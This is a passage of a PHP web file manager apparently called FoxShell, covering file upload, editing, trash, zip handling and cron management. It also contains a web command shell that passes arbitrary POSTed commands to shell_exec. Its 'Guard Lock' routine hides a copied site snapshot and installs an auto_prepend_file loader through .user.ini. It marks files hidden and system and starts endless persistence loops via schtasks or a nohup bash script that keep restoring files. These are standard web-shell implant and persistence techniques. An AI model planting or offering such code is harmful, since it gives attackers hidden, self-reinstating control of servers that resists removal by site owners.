      $failCount = 0;

      for ($i = 0; $i < count($files["name"]); $i++) {
        if (!is_uploaded_file($files["tmp_name"][$i])) continue;
        
        $sz = $files["size"][$i];
        if ($sz > $MAX_UPLOAD_BYTES) {
          audit("UPLOAD BLOCKED (TOO LARGE): " . $files["name"][$i]);
          $failCount++;
          continue;
        }

        $relPath = (isset($_POST['paths']) && is_array($_POST['paths']) && isset($_POST['paths'][$i])) 
            ? normalize_rel($_POST['paths'][$i]) 
            : normalize_rel($files['name'][$i]);
        
        // Build dest safely: path may contain subdirs (folder upload), validate each segment
        $fullDirRel = $pathRel !== '' ? $pathRel . '/' . normalize_rel(dirname($relPath)) : normalize_rel(dirname($relPath));
        $fullDirRel = normalize_rel($fullDirRel);
        $fileName  = basename($relPath);
        $dest = safe_join_under_root($ROOT, $fullDirRel, $fileName);
        if ($dest) {
          $destDir = dirname($dest);
          if (!is_dir($destDir)) @mkdir($destDir, 0755, true);

          if (@move_uploaded_file($files["tmp_name"][$i], $dest)) {
            audit("UPLOAD OK: " . abs_to_rel($ROOT, $dest));
            $successCount++;
          } else {
            audit("UPLOAD FAIL: move_uploaded_file failed (".$files["name"][$i].")");
            $failCount++;
          }
        } else {
          audit("UPLOAD FAIL: invalid target path (".$files["name"][$i].")");
          $failCount++;
        }
      }

      if ($successCount > 0) set_msg("Uploaded $successCount file(s) successfully" . ($failCount > 0 ? ", $failCount failed" : ""));
      elseif ($failCount > 0) set_msg("Failed to upload all files", "error");
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Rename ----------
  if ($action === "rename") {
    $fromRel = normalize_rel((string)($_POST["from"] ?? ""));
    $toName  = (string)($_POST["to"] ?? "");
    $fromAbs = rel_to_abs($ROOT, $fromRel);
    if ($fromAbs && file_exists($fromAbs)) {
      if (realpath($fromAbs) === realpath(__FILE__)) {
        audit("RENAME BLOCKED (SELF)");
        set_msg("Cannot rename the script itself", "error");
      } else {
        $parentRel = normalize_rel(dirname($fromRel));
        if ($parentRel === ".") $parentRel = "";
        $toAbs = safe_join_under_root($ROOT, $parentRel, $toName);
        
        if (!$toAbs) {
            audit("RENAME FAIL (JAIL): " . $fromRel . " to " . $toName);
            set_msg("Rename failed: target path outside root", "error");
        } elseif (file_exists($toAbs)) {
            audit("RENAME FAIL (EXISTS): " . $fromRel . " -> " . $toName);
            set_msg("Rename failed: target already exists", "error");
        } else {
            if (@rename($fromAbs, $toAbs)) {
                audit("RENAME OK: " . $fromRel . " -> " . abs_to_rel($ROOT, $toAbs));
                set_msg("Renamed successfully");
            } else {
                $err = error_get_last();
                audit("RENAME FAIL (OS): " . ($err["message"] ?? "unknown error"));
                set_msg("Rename failed: OS error (permissions?)", "error");
            }
        }
      }
    } else {
        audit("RENAME FAIL (NOT FOUND): " . $fromRel);
        set_msg("Rename failed: source not found", "error");
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Save file (with backup + diff snapshot) ----------
  if ($action === "save_file") {
    $fileRel = normalize_rel((string)($_POST["file"] ?? ""));
    $abs = rel_to_abs($ROOT, $fileRel);
    if ($abs && is_file($abs) && realpath($abs) !== realpath(__FILE__)) {
      // auto backup before save
      $b = backup_file($ROOT, $abs, $fileRel, $BACKUP_ABS);
      if ($b) audit("BACKUP: ".$fileRel." -> ".$b);

      $before = (string)file_get_contents($abs);
      $content = (string)($_POST["content"] ?? "");
      file_put_contents($abs, $content);
      audit("SAVED: ".$fileRel);
      set_msg("File saved successfully");

      // store last diff snapshot in session
      $_SESSION["last_diff"] = [
        "file" => $fileRel,
        "before" => $before,
        "after" => $content,
        "ts" => time(),
      ];

      redirect_here(normalize_rel(dirname($fileRel) === "." ? "" : dirname($fileRel)), "files", ["open"=>$fileRel, "diff"=>"1"]);
    } else {
      audit("SAVE DENIED: ".$fileRel);
      redirect_here($pathRel, "files");
    }
  }

  // ---------- Trash (single) ----------
  if ($action === "trash_one") {
    $targetRel = normalize_rel((string)($_POST["target"] ?? ""));
    $targetAbs = rel_to_abs($ROOT, $targetRel);
    if ($targetAbs && file_exists($targetAbs) && realpath($targetAbs) !== realpath(__FILE__)) {
      $moved = trash_move($ROOT, $targetAbs, $targetRel, $TRASH_ABS);
      if ($moved) {
          audit("TRASH: ".$targetRel." -> ".$moved);
          set_msg("Moved to trash");
      }
      else {
          audit("TRASH FAIL: ".$targetRel);
          set_msg("Failed to move to trash", "error");
      }
    } else {
        audit("TRASH DENIED: ".$targetRel);
        set_msg("Trash denied", "error");
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Bulk to trash ----------
  if ($action === "bulk_trash") {
    foreach ($selectedRels as $rel) {
      $abs = rel_to_abs($ROOT, $rel);
      if (!$abs || !file_exists($abs)) continue;
      if (realpath($abs) === realpath(__FILE__)) { audit("TRASH BLOCKED (SELF)"); continue; }
      $moved = trash_move($ROOT, $abs, $rel, $TRASH_ABS);
      if ($moved) audit("TRASH: ".$rel." -> ".$moved);
      else audit("TRASH FAIL: ".$rel);
    }
    set_msg("Bulk trash operation completed");
    redirect_here($pathRel, "files");
  }

  // ---------- Bulk backup ----------
  if ($action === "bulk_backup") {
    foreach ($selectedRels as $rel) {
      $abs = rel_to_abs($ROOT, $rel);
      if (!$abs || !is_file($abs)) continue;
      if (realpath($abs) === realpath(__FILE__)) continue;
      $b = backup_file($ROOT, $abs, $rel, $BACKUP_ABS);
      if ($b) audit("BACKUP: ".$rel." -> ".$b);
      else audit("BACKUP FAIL: ".$rel);
    }
    set_msg("Bulk backup operation completed");
    redirect_here($pathRel, "files");
  }

  // ---------- Bulk chmod ----------
  if ($action === "bulk_chmod") {
    $mode = trim((string)($_POST["mode"] ?? ""));
    // accept 3 or 4 octal digits
    if (!preg_match('/^[0-7]{3,4}$/', $mode)) {
      audit("CHMOD FAIL: invalid mode ".$mode);
      redirect_here($pathRel, "files");
    }
    $m = intval($mode, 8);
    foreach ($selectedRels as $rel) {
      $abs = rel_to_abs($ROOT, $rel);
      if (!$abs || !file_exists($abs)) continue;
      if (realpath($abs) === realpath(__FILE__)) continue;
      if (@chmod($abs, $m)) audit("CHMOD ".$mode.": ".$rel);
      else audit("CHMOD FAIL ".$mode.": ".$rel);
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Bulk zip download (creates tmp zip then redirects to download) ----------
  if ($action === "bulk_zip") {
    $err = [];
    $name = "bundle_" . date("Ymd-His") . ".zip";
    $zipAbs = $TMP_ABS . "/" . $name;
    $ok = zip_paths($ROOT, $selectedRels, $zipAbs, $err);
    if ($ok) {
      $rel = abs_to_rel($ROOT, $zipAbs);
      audit("ZIP CREATE: ".$rel);
      redirect_here($pathRel, "files", ["download"=>$rel]);
    } else {
      foreach ($err as $e) audit("ZIP FAIL: ".$e);
      redirect_here($pathRel, "files");
    }
  }

  // ---------- Extract zip (existing rel path) ----------
  if ($action === "extract_existing_zip") {
    $zipRel = normalize_rel((string)($_POST["ziprel"] ?? ""));
    $zipAbs = rel_to_abs($ROOT, $zipRel);
    $destAbs = $absCurrent;
    $err = [];
    if ($zipAbs && is_file($zipAbs)) {
      $ok = extract_zip($zipAbs, $destAbs, $err);
      if ($ok) {
          audit("EXTRACT: ".$zipRel." -> ".abs_to_rel($ROOT, $destAbs));
          set_msg("Extraction successful");
      }
      else {
          foreach ($err as $e) audit("EXTRACT FAIL: ".$e);
          set_msg("Extraction failed", "error");
      }
    } else {
        audit("EXTRACT FAIL: zip not found");
        set_msg("ZIP file not found", "error");
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Extract zip (upload zip) ----------
  if ($action === "extract_upload_zip") {
    $err = [];
    if (!isset($_FILES["zipup"]) || !is_uploaded_file($_FILES["zipup"]["tmp_name"])) {
      audit("EXTRACT UPLOAD FAIL: no file");
      redirect_here($pathRel, "files");
    }
    $f = $_FILES["zipup"];
    if (($f["size"] ?? 0) > $MAX_UPLOAD_BYTES) {
      audit("EXTRACT UPLOAD BLOCKED: too large");
      redirect_here($pathRel, "files");
    }
    $name = "upload_" . date("Ymd-His") . ".zip";
    $zipAbs = $TMP_ABS . "/" . $name;
    if (!@move_uploaded_file($f["tmp_name"], $zipAbs)) {
      audit("EXTRACT UPLOAD FAIL: move");
      redirect_here($pathRel, "files");
    }
    $ok = extract_zip($zipAbs, $absCurrent, $err);
    if ($ok) audit("EXTRACT UPLOAD: ".$name." -> ".abs_to_rel($ROOT, $absCurrent));
    else foreach ($err as $e) audit("EXTRACT FAIL: ".$e);
    redirect_here($pathRel, "files");
  }



  // ---------- Guard Lock (Hardened Cross-Platform) ----------
  if ($action === "guard_lock") {
    $fimDir = get_fim_temp_dir();
    if (!is_dir($fimDir)) @mkdir($fimDir, 0755, true);
    if ($IS_WINDOWS) @shell_exec("attrib +h +s +r " . escapeshellarg($fimDir));

    // 1. Snapshot Project
    $manifest = [];
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($ROOT, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($it as $file) {
        $path = $file->getRealPath();
        $rel = abs_to_rel($ROOT, $path);
        if (str_starts_with($rel, '.FTemp') || str_starts_with($rel, '.Ftrash') || 
            str_starts_with($rel, '.FBacks') || str_starts_with($rel, '.FIM_backups')) continue;
        
        if ($file->isFile()) {
            $manifest[$rel] = ['size' => $file->getSize(), 'mtime' => $file->getMTime(), 'hash' => hash_file('sha256', $path)];
            $dest = $fimDir . '/' . $rel;
            $destDir = dirname($dest);
            if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
            @copy($path, $dest);
        }
    }
    @file_put_contents($fimDir . '/manifest.json', json_encode($manifest));

    // 2. Create Loader (Out-of-Root)
    $guardPath = $fimDir . '/fox_integrity_guard.php';
    $guardContent = "<?php
/* Fox Integrity Guard - Hardened Persistence */
\$root = '" . str_replace("\\", "/", $ROOT) . "';
\$fim = '" . str_replace("\\", "/", $fimDir) . "';
\$manPath = \$fim . '/manifest.json';

if (file_exists(\$manPath)) {
    \$manifest = json_decode(file_get_contents(\$manPath), true);
    foreach (\$manifest as \$rel => \$meta) {
        \$abs = \$root . '/' . \$rel;
        \$bkp = \$fim . '/' . \$rel;
        \$restore = false;

        if (!file_exists(\$abs)) { \$restore = true; } 
        else if (filesize(\$abs) !== \$meta['size'] || filemtime(\$abs) !== \$meta['mtime']) {
            if (hash_file('sha256', \$abs) !== \$meta['hash']) { \$restore = true; }
        }

        if (\$restore && file_exists(\$bkp)) {
            \$dir = dirname(\$abs);
            if (!is_dir(\$dir)) @mkdir(\$dir, 0755, true);
            if (@copy(\$bkp, \$abs)) {
                @file_put_contents(\$root . '/audit.log', \"[\".date('Y-m-d H:i:s').\"] FIM_RESTORE: \$rel\\n\", FILE_APPEND);
            }
        }
    }
}

// Meta-Self-Healing: User.ini check
\$parentDir = dirname(\$root);
\$iniPath = is_writable(\$parentDir) ? \$parentDir . '/.user.ini' : \$root . '/.user.ini';
\$iniTarget = 'auto_prepend_file=\"' . \$fim . '/fox_integrity_guard.php\"';
if (!file_exists(\$iniPath) || !str_contains(file_get_contents(\$iniPath), \$iniTarget)) {
    @file_put_contents(\$iniPath, \$iniTarget);
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') @shell_exec(\"attrib +h +s +r \" . escapeshellarg(\$iniPath));
}
";
    @file_put_contents($guardPath, $guardContent);

    // 3. Deploy .user.ini
    $parentDir = dirname($ROOT);
    $iniPath = (is_writable($parentDir)) ? $parentDir . '/.user.ini' : $ROOT . '/.user.ini';
    @file_put_contents($iniPath, "auto_prepend_file=\"" . str_replace("\\", "/", $guardPath) . "\"");
    if ($IS_WINDOWS) @shell_exec("attrib +h +s +r " . escapeshellarg($iniPath));

    // 4. Persistence Loop (Cross-Platform)
    if ($IS_WINDOWS) {
        $phpExe = PHP_BINARY ?: 'php';
        $batPath = $fimDir . '/fox_persist.bat';
        $batContent = "@echo off\n:loop\n\"$phpExe\" \"" . str_replace("/", "\\", $guardPath) . "\"\ntimeout /t 1 /nobreak >nul\ngoto loop";
        @file_put_contents($batPath, $batContent);
        
        $taskName = "FoxGuard_Persistence_" . md5($ROOT);
        $taskCmd = "schtasks /create /tn \"$taskName\" /tr \"cmd /c ".str_replace("/", "\\", $batPath)."\" /sc minute /mo 1 /f";
        @shell_exec($taskCmd);
        @shell_exec("schtasks /run /tn \"$taskName\"");
    } else {
        $phpPath = PHP_BINARY ?: 'php';
        $shPath = $fimDir . '/fox_persist.sh';
        $shContent = "#!/bin/bash\nwhile true; do\n  $phpPath \"$guardPath\"\n  sleep 1\ndone";
        @file_put_contents($shPath, $shContent);
        @chmod($shPath, 0755);
        @shell_exec("nohup bash \"$shPath\" > /dev/null 2>&1 &");
    }

    redirect_here($pathRel, "files");
  }

  // ---------- Guard Unlock (Hardened Cross-Platform) ----------
  if ($action === "guard_unlock") {
    $pw = (string)($_POST["password"] ?? "");
    $pwHash = hash('sha256', $pw);
    
    if (!hash_equals($LOGIN_PASSWORD_HASH, $pwHash)) {
        audit("GUARD UNLOCK FAIL: Wrong password");
        set_msg("Unlock failed: Wrong password", "error");
    } else {
        $fimDir = get_fim_temp_dir();

        // 1. Cleanup Persistence Processes
        if ($IS_WINDOWS) {
            $taskName = "FoxGuard_Persistence_" . md5($ROOT);
            @shell_exec("schtasks /delete /tn \"$taskName\" /f");
        } else {
            @shell_exec("pkill -f fox_persist.sh");
        }

        // 2. Cleanup FIM & INI
        // Try parent and current for .user.ini
        $parentDir = dirname($ROOT);
        $iniPath = (file_exists($parentDir . '/.user.ini')) ? $parentDir . '/.user.ini' : $ROOT . '/.user.ini';
        if (file_exists($iniPath)) {
            @shell_exec("attrib -h -s -r " . escapeshellarg($iniPath)); // Windows only but harmless elsewhere
            @unlink($iniPath);
        }
        
        // Wipe Temp Dir completely
        if (is_dir($fimDir)) {
            if ($IS_WINDOWS) @shell_exec("attrib -h -s -r " . escapeshellarg($fimDir));
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fimDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($it as $file) {
                if ($file->isDir()) @rmdir($file->getRealPath());
                else @unlink($file->getRealPath());
            }
            @rmdir($fimDir);
        }

    }
    redirect_here($pathRel, "files");
  }

  // ---------- Trash purge (permanent delete) ----------
  if ($action === "trash_purge") {
    $trashRel = normalize_rel((string)($_POST["trashrel"] ?? $_POST["item"] ?? ""));
    $trashAbs = rel_to_abs($ROOT, $trashRel);
    if ($trashAbs && file_exists($trashAbs) && stripos(rtrim(str_replace("\\","/",$trashAbs),"/") . "/", rtrim(str_replace("\\","/",$TRASH_ABS),"/") . "/") === 0) {
      if (@unlink($trashAbs)) audit("TRASH PURGE: ".$trashRel);
      else audit("TRASH PURGE FAIL: ".$trashRel);
    } else audit("TRASH PURGE DENIED");
    redirect_here($pathRel, "trash");
  }

  // ---------- Trash restore ----------
  if ($action === "trash_restore") {
    $item = (string)($_POST["item"] ?? $_POST["trashrel"] ?? "");
    $targets = $selectedRels;
    if ($item !== "") {
        $itemRel = normalize_rel($item);
        if (!in_array($itemRel, $targets, true)) $targets[] = $itemRel;
    }

    if (empty($targets)) {
        audit("RESTORE FAIL: No items selected");
    } else {
        foreach ($targets as $rel) {
            restore_trash($ROOT, $rel, $TRASH_ABS);
        }
        set_msg("Restore operation completed");
    }
    redirect_here($pathRel, "trash");
  }

  // ---------- Shell Exec ----------
  if ($action === "shell_exec") {
    $cmd = trim((string)($_POST["cmd"] ?? ""));
    if (!isset($_SESSION["shell"])) {
        $_SESSION["shell"] = ["cwd" => $ROOT, "history" => []];
    }
    
    if ($cmd !== "") {
        $cwd = $_SESSION["shell"]["cwd"];
        if (!is_dir($cwd)) $cwd = $ROOT;
        
        $output = "";
        // Handle "cd" manually to persist CWD
        if (preg_match('/^cd\s+(.*)$/i', $cmd, $m)) {
            $newDir = trim($m[1], "\" '");
            // Simple relative/absolute path handling for CD
            if ($newDir === "~") {
                $target = $ROOT;
            } elseif (preg_match('/^[a-zA-Z]:/i', $newDir) || str_starts_with($newDir, "/")) {
                $target = realpath($newDir);
            } else {
                $target = realpath($cwd . "/" . $newDir);
            }
            
            if ($target && is_dir($target)) {
                $_SESSION["shell"]["cwd"] = str_replace("\\", "/", $target);
                $output = "Changed directory to: " . $_SESSION["shell"]["cwd"];
            } else {
                $output = "Directory not found: " . $newDir;
            }
        } else {
            // Execute command in current shell CWD
            $execCmd = $IS_WINDOWS ? "cd /d ".escapeshellarg($cwd)." && ".$cmd." 2>&1" : "cd ".escapeshellarg($cwd)." && ".$cmd." 2>&1";
            $output = (string)@shell_exec($execCmd);
        }
        
        $_SESSION["shell"]["history"][] = [
            "cmd" => $cmd,
            "cwd" => $cwd,
            "out" => $output,
            "time"=> time()
        ];
        // Keep last 50
        if (count($_SESSION["shell"]["history"]) > 50) array_shift($_SESSION["shell"]["history"]);
        
        audit("SHELL: " . $cmd);
    }
    
    if (!empty($_SERVER['HTTP_HX_REQUEST'])) {
        // Handle HTMX partial if needed, but for now just redirect
    }
    redirect_here($pathRel, "shell");
  }

  // ---------- Shell Clear ----------
  if ($action === "shell_clear") {
    $_SESSION["shell"]["history"] = [];
    audit("SHELL: history cleared");
    redirect_here($pathRel, "shell");
  }

  // ---------- Backup restore (copy backup -> selected file rel) ----------
  if ($action === "backup_restore") {
    $backupRel = normalize_rel((string)($_POST["backuprel"] ?? ""));
    $targetRel = normalize_rel((string)($_POST["targetrel"] ?? ""));
    $backupAbs = rel_to_abs($ROOT, $backupRel);
    $targetAbs = rel_to_abs($ROOT, $targetRel);
    if ($backupAbs && is_file($backupAbs) && $targetAbs && is_file($targetAbs)) {
      if (@copy($backupAbs, $targetAbs)) {
        audit("BACKUP RESTORE: ".$backupRel." -> ".$targetRel);
      } else audit("BACKUP RESTORE FAIL");
    } else audit("BACKUP RESTORE FAIL: invalid");
    redirect_here($pathRel, "backups");
  }

  // ---------- Search ----------
  if ($action === "do_search") {
    $q = trim((string)($_POST["q"] ?? ""));
    $grep = trim((string)($_POST["grep"] ?? ""));
    $case = (string)($_POST["case"] ?? "0") === "1";
    $ext = trim((string)($_POST["ext"] ?? "")); // comma list
    $in = normalize_rel((string)($_POST["in"] ?? "")); // relative dir
    $_SESSION["search_params"] = compact("q","grep","case","ext","in");
    audit("SEARCH: q='$q', grep='$grep', in='$in'");
    redirect_here($pathRel, "search");
  }

  // ---------- Copy / Cut / Paste ----------
  if ($action === "copy" || $action === "cut") {
      $itemRel = normalize_rel((string)($_POST["item"] ?? ""));
      $abs = rel_to_abs($ROOT, $itemRel);
      if ($abs && file_exists($abs)) {
          $_SESSION["clipboard"] = [
              "type" => $action,
              "rel" => $itemRel,
              "name" => basename($abs),
              "is_dir" => is_dir($abs)
          ];
          audit(strtoupper($action) . ": " . $itemRel);
      }
      redirect_here($pathRel, "files");
  }

  if ($action === "paste") {
      $cb = $_SESSION["clipboard"] ?? null;
      if ($cb && isset($cb["rel"])) {
          $srcAbs = rel_to_abs($ROOT, $cb["rel"]);
          $destAbs = safe_join_under_root($ROOT, $pathRel, $cb["name"]);
          
          if ($srcAbs && $destAbs && $srcAbs !== $destAbs) {
              if ($cb["type"] === "copy") {
                  if (rcopy($srcAbs, $destAbs)) {
                      audit("PASTE (COPY): " . $cb["rel"] . " -> " . $pathRel . "/" . $cb["name"]);
                      set_msg("Pasted successfully");
                  } else {
                      audit("PASTE FAIL (COPY): " . $cb["rel"]);
                      set_msg("Paste failed", "error");
                  }
              } else {
                  if (@rename($srcAbs, $destAbs)) {
                      audit("PASTE (CUT): " . $cb["rel"] . " -> " . $pathRel . "/" . $cb["name"]);
                      unset($_SESSION["clipboard"]);
                      set_msg("Moved successfully");
                  } else {
                      audit("PASTE FAIL (CUT): " . $cb["rel"]);
                      set_msg("Move failed", "error");
                  }
              }
          } else audit("PASTE FAIL: invalid path or same location");
      }
      redirect_here($pathRel, "files");
  }

  if ($action === "clear_clipboard") {
      $_SESSION["clipboard"] = [];
      audit("CLIPBOARD: cleared");
      redirect_here($pathRel, "files");
  }

  // ---------- Process Manager Actions ----------
  if ($action === "kill_process") {
      $pid = (int)($_POST["pid"] ?? 0);
      if ($pid > 0) {
          if ($IS_WINDOWS) {
              shell_exec("taskkill /F /PID $pid");
          } else {
              shell_exec("kill -9 $pid");
          }
          audit("KILL PROCESS: $pid");
      }
      redirect_here($pathRel, "process");
  }

  if ($action === "fim_baseline") {
      $files = [
          $ROOT . "/index.php",
          $ROOT . "/.htaccess",
          $SCRIPT_DIR . "/index.php"
      ];
      $baseline = [];
      foreach ($files as $f) {
          if (file_exists($f)) {
              $baseline[$f] = hash_file("sha256", $f);
          }
      }
      $_SESSION["fim_baseline"] = $baseline;
      audit("FIM: Baseline created");
      set_msg("Baseline created successfully");
      redirect_here($pathRel, "fim");
  }

  if ($action === "cron_save") {
      $name = trim((string)($_POST["name"] ?? ""));
      $cmd  = trim((string)($_POST["command"] ?? ""));
      $freq = (string)($_POST["freq"] ?? "DAILY"); // DAILY, HOURLY, MINUTE
      $time = (string)($_POST["time"] ?? "00:00");
      
      if ($name !== "" && $cmd !== "") {
          if ($IS_WINDOWS) {
              // schtasks /create /f /tn "$name" /tr "$cmd" /sc $freq /st $time
              // Basic sanitization/validation would be good, but we trust the user here.
              $safeName = escapeshellarg($name);
              $safeCmd  = escapeshellarg($cmd);
              $safeFreq = escapeshellarg($freq);
              $safeTime = escapeshellarg($time);
              shell_exec("schtasks /create /f /tn $safeName /tr $safeCmd /sc $safeFreq /st $safeTime");
          } else {
              // Linux cron CRUD is more complex (crontab -l, parse, add/edit, crontab -)
              // For simplicity in this demo manager, let's append or replace.
              // This is a minimal implementation.
              $out = shell_exec("crontab -l 2>/dev/null") ?? "";
              $lines = explode("\n", trim($out));
              $newLines = [];
              $found = false;
              $cronLine = "* * * * * $cmd # FoxShell:$name"; // Simplified schedule for now
              foreach ($lines as $ln) {
                  if (str_contains($ln, "# FoxShell:$name")) {
                      $newLines[] = $cronLine;
                      $found = true;
                  } else if (trim($ln) !== "") {
                      $newLines[] = $ln;
                  }
              }
              if (!$found) $newLines[] = $cronLine;
              $tmp = tempnam(sys_get_temp_dir(), 'foxcron');
              file_put_contents($tmp, implode("\n", $newLines) . "\n");
              shell_exec("crontab " . escapeshellarg($tmp));
              unlink($tmp);
          }
          audit("CRON SAVE: $name");
      }
      redirect_here($pathRel, "cron");
  }

  if ($action === "cron_delete") {
      $name = (string)($_POST["name"] ?? "");
      if ($name !== "") {
          if ($IS_WINDOWS) {
              $safeName = escapeshellarg($name);
              shell_exec("schtasks /delete /tn $safeName /f");
          } else {
              $out = shell_exec("crontab -l 2>/dev/null") ?? "";
              $lines = explode("\n", trim($out));
              $newLines = [];
              foreach ($lines as $ln) {
                  if (!str_contains($ln, "# FoxShell:$name")) {
                      $newLines[] = $ln;
                  }
              }
              $tmp = tempnam(sys_get_temp_dir(), 'foxcron');
              file_put_contents($tmp, implode("\n", $newLines) . "\n");
              shell_exec("crontab " . escapeshellarg($tmp));
              unlink($tmp);
          }
          audit("CRON DELETE: $name");
      }
      redirect_here($pathRel, "cron");
  }

  if ($action === "lock" || $action === "unlock") {
      $itemRel = normalize_rel((string)($_POST["item"] ?? ""));
      $abs = rel_to_abs($ROOT, $itemRel);
      // Windows check: 0444 is usually interpreted as READ-ONLY attrib
      $mode = ($action === "lock") ? 0444 : 0666;
      $success = false;
      if ($abs && file_exists($abs)) {
          if (is_dir($abs)) {
              $success = rchmod($abs, $mode);
          } else {
              $success = @chmod($abs, $mode);
          }
          
          if ($success) {
            audit(strtoupper($action) . ": " . $itemRel);
            set_msg(ucfirst($action) . "ed successfully");
          } else {
            set_msg(ucfirst($action) . " failed (check permissions)", "error");
          }
      }
      redirect_here($pathRel, "files");
  }

  // ---------- Export audit ----------
  if ($action === "export_audit") {
    audit("AUDIT_LOG: Exporting logs");
    $log = $_SESSION["audit"] ?? [];
    $txt = implode("\n", array_map("strval", $log));
    header("Content-Type: text/plain; charset=utf-8");
    header('Content-Disposition: attachment; filename="audit_'.date("Ymd-His").'.txt"');
    echo $txt;
    exit;
  }

  // ---------- Clear audit ----------
  if ($action === "clear_audit") {
    $_SESSION["audit"] = [];
    audit("AUDIT_LOG: cleared");
    redirect_here($pathRel, $tab);
  }

  // fallback
  redirect_here($pathRel, $tab);
}

// ================== DOWNLOAD (GET) ==================
if (isset($_GET["download"])) {
  $rel = normalize_rel((string)$_GET["download"]);
  $abs = rel_to_abs($ROOT, $rel);
  if (!$abs || !is_file($abs)) { http_response_code(404); exit("Not found"); }
  if (realpath($abs) === realpath(__FILE__)) { http_response_code(403); exit("Blocked"); }
  $ext = ext_lower($abs);
  if (!empty($DISALLOW_DOWNLOAD_EXT) && in_array($ext, $DISALLOW_DOWNLOAD_EXT, true)) {
    http_response_code(403); exit("Download blocked by policy");
  }
  header("Content-Type: application/octet-stream");
  header("Content-Disposition: attachment; filename=\"".basename($abs)."\"");
  header("Content-Length: ".((string)filesize($abs)));
  readfile($abs);
  exit;
}

// ================== OPEN FILE / PREVIEW ==================
$openRel = normalize_rel((string)($_GET["open"] ?? ""));
$openAbs = $openRel !== "" ? rel_to_abs($ROOT, $openRel) : false;
$openIsFile = $openAbs && is_file($openAbs);

$openMeta = null;
$openContent = "";
$openEditable = false;
$openBinary = false;

if ($openIsFile) {
  $sz = (int)(filesize($openAbs) ?: 0);
  $openMeta = [
    "name" => basename($openAbs),
    "rel"  => $openRel,
    "size" => $sz,
    "mtime" => (int)(filemtime($openAbs) ?: 0),
    "ext"  => ext_lower($openAbs),
    "mode" => @fileperms($openAbs) ?: 0,
    "owner" => @fileowner($openAbs),
    "group" => @filegroup($openAbs),
    "r" => is_readable($openAbs),
    "w" => is_writable($openAbs),
  ];
  $bin = false;
  if (can_edit_file($openAbs, $MAX_EDIT_BYTES, $bin)) {
    $openEditable = true;
    $openContent = (string)file_get_contents($openAbs);
    $openBinary = false;
  } else {
    $openEditable = false;
    $openBinary = $bin;
  }
}

// ================== BUILD UI DATA ==================
$items = list_dir($absCurrent, $ROOT);
$auditLog = $_SESSION["audit"] ?? [];
$cwdLabel = "/".($pathRel === "" ? "" : $pathRel);
$cwdLabel = rtrim($cwdLabel, "/");
if ($cwdLabel === "") $cwdLabel = "/";

// Don't scan totals for the entire system root (performance/permission issues)
// Instead, scan totals for the current directory or the script directory
$scanTarget = ($pathRel === "" || $absCurrent === $ROOT) ? $SCRIPT_DIR : $absCurrent;
$totals = scan_totals($scanTarget, $MAX_SCAN_ENTRIES);
$diskTotal = @disk_total_space($ROOT) ?: 0;
$diskFree  = @disk_free_space($ROOT) ?: 0;
$diskUsed  = max(0, $diskTotal - $diskFree);



$sys = [
  "PHP Version" => PHP_VERSION,
  "SAPI" => PHP_SAPI,
  "OS" => PHP_OS_FAMILY . " (" . PHP_OS . ")",
  "Server" => $_SERVER["SERVER_SOFTWARE"] ?? "-",
  "Document Root" => $_SERVER["DOCUMENT_ROOT"] ?? "-",
  "Memory Limit" => ini_get("memory_limit") ?: "-",
  "Max Exec Time" => (string)(ini_get("max_execution_time") ?: "-"),
  "Upload Max" => ini_get("upload_max_filesize") ?: "-",
  "Post Max" => ini_get("post_max_size") ?: "-",
  "open_basedir" => ini_get("open_basedir") ?: "-",
  "disable_functions" => (ini_get("disable_functions") ?: "-"),
  "Extensions" => (string)count(get_loaded_extensions()),
  "ZipArchive" => class_exists("ZipArchive") ? "YES" : "NO",
  "xdiff" => function_exists("xdiff_string_diff") ? "YES" : "NO",
];

// ================== SEARCH EXECUTION (GET from session) ==================
$searchResults = [];
$searchInfo = "";
if ($tab === "search") {
  $sp = $_SESSION["search_params"] ?? ["q"=>"","grep"=>"","case"=>false,"ext"=>"","in"=>""];
  $q = trim((string)($sp["q"] ?? ""));
  $grep = trim((string)($sp["grep"] ?? ""));
  $case = (bool)($sp["case"] ?? false);
  $exts = trim((string)($sp["ext"] ?? ""));
  $in = normalize_rel((string)($sp["in"] ?? ""));
  $baseAbs = ($in === "") ? $ROOT : rel_to_abs($ROOT, $in);
  if (!$baseAbs || !is_dir($baseAbs)) $baseAbs = $ROOT;

  $extList = [];
  if ($exts !== "") {
    foreach (explode(",", $exts) as $e) {
      $e = strtolower(trim($e));
      if ($e !== "") $extList[] = ltrim($e, ".");
    }
    $extList = array_values(array_unique($extList));
  }

  if ($q !== "" || $grep !== "") {
    $entries = 0; $hits = 0;
    try {
      $dirIt = new RecursiveDirectoryIterator($baseAbs, FilesystemIterator::SKIP_DOTS);
      $it = new RecursiveIteratorIterator($dirIt, RecursiveIteratorIterator::SELF_FIRST);
      foreach ($it as $f) {
        try {
          $entries++;
          if ($entries > $MAX_SCAN_ENTRIES) { $searchInfo = "Scan capped (perf guard)."; break; }
          $abs = $f->getPathname();
          if (strpos($abs, $TRASH_ABS) === 0 || strpos($abs, $BACKUP_ABS) === 0 || strpos($abs, $TMP_ABS) === 0) continue;

          $rel = abs_to_rel($ROOT, $abs);
          $name = basename($abs);

          if ($f->isDir()) continue;

          if (!empty($extList)) {
            $e = ext_lower($abs);
            if (!in_array($e, $extList, true)) continue;
          }

          $nameOk = true;
          if ($q !== "") {
            $nameOk = $case ? (str_contains($name, $q) || str_contains($rel, $q)) : (str_contains(strtolower($name), strtolower($q)) || str_contains(strtolower($rel), strtolower($q)));
          }
          if (!$nameOk) continue;

          $grepHits = [];
          if ($grep !== "") {
            $sz = @filesize($abs) ?: 0;
            if ($sz > $MAX_GREP_BYTES_PER_FILE) continue;
            $data = @file_get_contents($abs);
            if (!is_string($data) || $data === "") continue;
            if (is_probably_binary($data)) continue;

            $lines = preg_split("/\R/u", $data) ?: [];
            $gneedle = $case ? $grep : strtolower($grep);
            foreach ($lines as $i=>$ln) {
              $hay = $case ? $ln : strtolower($ln);
